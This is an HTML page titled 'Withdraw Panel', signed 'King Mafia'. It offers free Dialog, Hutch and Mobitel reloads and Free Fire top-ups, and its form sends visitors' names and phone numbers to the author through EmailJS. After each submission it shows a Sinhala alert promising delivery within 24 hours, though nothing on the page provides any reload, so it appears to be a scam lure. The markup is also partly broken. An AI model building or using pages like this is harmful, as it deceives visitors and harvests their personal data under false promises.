<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Withdraw Panel</title>
  <style>
    body {
      background: #000;
      color: #fff;
      font-family: Arial;
      text-align: center;
      padding: 20px;
    }

    h1 {
      font-size: 28px;
      margin-bottom: 20px;
    }

    .button {
      padding: 10px 20px;
      background: limegreen;
      color: #000;
      font-weight: bold;
      font-size: 16px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
    }

    .card-buttons {
      margin-top: 20px;
    }

    .card-button {
      border: 2px solid limegreen;
      background: #000;
      color: limegreen;
      padding: 10px 20px;
      border-radius: 10px;
      margin: 5px;
      cursor: pointer;
    }

    .card-button img {
      width: 24px;
      height: 24px;
      vertical-align: middle;
      margin-right: 5px;
    }

    #formContainer {
      display: none;
      margin-top: 30px;
      padding: 20px;
      border: 2px solid #0f0;
      border-radius: 10px;
      background-color: #111;
    }

    input {
      width: 90%;
      padding: 10px;
      margin: 10px auto;
      display: block;
      border-radius: 5px;
      border: none;
    }

    #cardImage {
      width: 100px;
      border-radius: 10px;
      margin: 10px auto;
    }

    #submitBtn {
      background: limegreen;
      color: #000;
      font-weight: bold;
    }

    small {
      display: block;
      margin-top: 20px;
      color: #888;
    }
  </style>
</head>
<body>

  <h1>Withdraw Panel</h1>
  <button class="button" onclick="showCardOptions()">Get Withdraw</button>

  <div class="card-buttons" id="cardOptions" style="display:none;">
    <button class="card-button" onclick="selectCard('Dialog')">
      <img src="https://i.postimg.cc/9FQhFcQS/dialog-logo-png-seeklogo-203576.png" alt="Dialog"> Dialog Card
    </button>
    <button class="card-button" onclick="selectCard('Hutch')">
      <img src="https://i.postimg.cc/gcDpWxm8/hutch-logo-png-seeklogo-323552.png" alt="Hutch"> Hutch Card
    </button>
    <div class="card-buttons" id="cardOptions" style="display:none;">
    <button class="card-button" onclick="selectCard('Mobitel')">
      <img src="https://i.postimg.cc/9FQhFcQS/dialog-logo-png-seeklogo-203576.png" alt="Dialog"> Mobitel card
    </button>
    <button class="card-button" onclick="selectCard('Hutch')">
      <img src="https://i.postimg.cc/gcDpWxm8/hutch-logo-png-seeklogo-323552.png" alt="FF id Top Up"> FF id Top up
    </button>
  </div>

  <div id="formContainer">
    <h2 id="formTitle"></h2>
    <img id="cardImage" src="" alt="Card Image">
    <form id="withdrawForm">
      <input type="text" id="name" placeholder="Your Name" required>
      <input type="text" id="number" placeholder="Massage" required>
      <input type="text" id="message" placeholder="Phone Number" required>
      <input type="text" id="time" readonly>
      <input type="submit" id="submitBtn" value="Submit">
    </form>
    <small>2025 - Made by King Mafia | KING MS</small>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
  <script>
    emailjs.init("JxcwLhzOOhD35rRUH");

    const form = document.getElementById("withdrawForm");
    const formContainer = document.getElementById("formContainer");
    const cardImage = document.getElementById("cardImage");
    const formTitle = document.getElementById("formTitle");

    function showCardOptions() {
      document.getElementById("cardOptions").style.display = "block";
    }

    function selectCard(type) {
      formContainer.style.display = "block";

      const now = new Date().toLocaleString();
      document.getElementById("time").value = now;

      if (type === "Dialog") {
        formTitle.innerText = "Dialog Reload";
        cardImage.src = "https://i.postimg.cc/9FQhFcQS/dialog-logo-png-seeklogo-203576.png";
      } else if (type === "Hutch") {
        formTitle.innerText = "Hutch Reload";
        cardImage.src = "https://i.postimg.cc/gcDpWxm8/hutch-logo-png-seeklogo-323552.png";
      }
    }

    form.addEventListener("submit", function (e) {
      e.preventDefault();
      const data = {
        name: document.getElementById("name").value,
        number: document.getElementById("number").value,
        message: document.getElementById("message").value,
        time: document.getElementById("time").value,
        title: formTitle.innerText,
      };

      emailjs.send("service_2wht3tb", "template_jrstb44", data)
        .then(() => {
          alert("✅ Withdraw request sent successfully!");
          alert("ඔබගෙ යිල්ලිම පැය 24 ක් ඇතුලත යිටු වෙනු ඇත")
          alert("Thank you!")
          form.reset();
          formContainer.style.display = "none";
        })
        .catch((err) => {
          console.error("❌ Error:", err);
          alert("❌ Something went wrong!");
        });
    });
  </script>

</body>
</html>
